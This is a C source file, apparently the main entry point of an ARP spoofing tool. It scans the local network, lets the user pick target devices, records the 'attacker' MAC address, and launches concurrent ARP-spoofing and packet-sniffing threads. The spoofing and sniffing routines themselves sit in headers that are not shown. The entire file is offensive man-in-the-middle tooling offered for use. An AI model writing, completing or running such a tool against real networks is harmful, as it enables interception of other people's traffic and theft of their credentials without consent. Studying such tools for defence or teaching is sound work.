#include <sys/types.h> 
#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <signal.h>      
#include <netinet/in.h>
#include <pcap.h>            
#include "arp.h"
#include "protocol.h"
#include "device_scanner.h"

void signal_handler(int sig) {
    printf("\n[*] Shutting down...\n");
    exit(0);
}

int main(int argc, char *argv[]) {
    scan_result_t scan_result;
    int target_indices[MAX_TARGETS];
    int selected_count;
    
    // Set up signal handler for graceful exit
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    printf("=== ARP Spoofing Tool ===\n");
    printf("Scanning network...\n");
    
    // Run network scan
    if (run_lan_scan(&scan_result) <= 0) {
        printf("Error: No devices found or scan failed\n");
        return 1;
    }
    
    // Display available devices
    display_devices(&scan_result);
    
    // Let user select targets
    selected_count = select_targets(&scan_result, target_indices, MAX_TARGETS);
    if (selected_count <= 0) {
        printf("No targets selected. Exiting.\n");
        return 1;
    }
    
    // Initialize interface settings
    strncpy(iface_name, scan_result.interface, IFNAMSIZ - 1);
    get_attacker_mac(iface_name, attacker_mac);
    get_interface_index(iface_name, &ifindex);
    
    // Setup targets
    setup_targets(&scan_result, target_indices, selected_count);
    
    printf("\n[*] Starting ARP spoofing and packet sniffing...\n");
    printf("[*] Press Ctrl+C to stop\n\n");
    
    // Create threads
    pthread_t spoof_thread, sniff_pthread;
    
    if (pthread_create(&spoof_thread, NULL, arp_spoof_thread, NULL) != 0) {
        perror("Failed to create ARP spoof thread");
        return 1;
    }
    
    if (pthread_create(&sniff_pthread, NULL, sniff_thread, NULL) != 0) {
        perror("Failed to create sniff thread");
        return 1;
    }
    
    // Wait for threads
    pthread_join(spoof_thread, NULL);
    pthread_join(sniff_pthread, NULL);
    
    return 0;
}